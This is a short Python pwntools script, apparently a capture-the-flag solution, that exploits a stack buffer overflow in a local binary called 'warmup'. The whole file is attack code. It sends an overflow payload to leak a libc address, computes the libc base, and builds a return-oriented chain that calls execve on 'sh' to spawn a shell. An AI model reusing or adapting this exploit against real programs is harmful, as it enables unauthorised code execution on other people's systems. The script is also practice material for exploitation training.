#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./warmup',checksec=False)
context.terminal = "tmux splitw -h".split(" ")
#s = process('socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./warmup,pty,setsid,sigint,sane,rawer'.split())
#p = remote('127.0.0.1', 10001)
p = process(elf.path)
gdb.attach(p)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
vuln = 0x40053d
write = 0x4004a0
read = 0x4004b0
ret = 0x000000000040057d

payload = b'A'*0x30+ p64(0x601018)+p64(0x40055d)+p64(0)*6
payload += p64(0x601018)+p64(0x40055d)+p64(0)*6+p64(0x601018)+p64(0x40053d)

p.sendafter(b'> ', payload)

data = p.recv(0xc0)
p.send(b'A'*8)
p.recvuntil(b'A'*8)
leak = u64(p.recv()[:8])
libc.address = leak - libc.sym["_IO_2_1_stderr_"]
print('libc = ', hex(libc.address))
p.send(p64(0))

pay = b'A' * 56
pay += p64(libc.search(asm('pop rdi; ret')).__next__())
pay += p64(libc.address + 0x1b45bd) # sh
pay += p64(libc.search(asm('pop rsi; ret')).__next__())
pay += p64(0)
pay += p64(libc.search(asm('pop rdx; pop rbx ;ret')).__next__())
pay += p64(0)
pay += p64(0)
pay += p64(libc.sym["execve"])
p.sendafter(b"> ", pay)

p.interactive()
